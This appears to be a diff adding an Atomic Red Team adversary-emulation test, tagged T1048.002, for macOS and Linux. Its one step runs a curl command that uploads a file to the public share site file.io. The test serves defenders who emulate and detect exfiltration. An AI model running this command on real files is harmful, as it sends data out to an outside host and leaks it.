@@ -1,0 +1,32 @@
+{
+  "id": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
+  "name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
+  "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
+  "platforms": [
+    "darwin",
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "923cfe9c-71af-4f3b-9902-468f3503575d",
+      "type": "execute-command",
+      "data": {
+        "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1048.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "input_file",
+      "type": "path",
+      "description": "Test file to upload",
+      "value": "PathToAtomicsFolder/T1048.002/src/artifact"
+    }
+  ]
+}
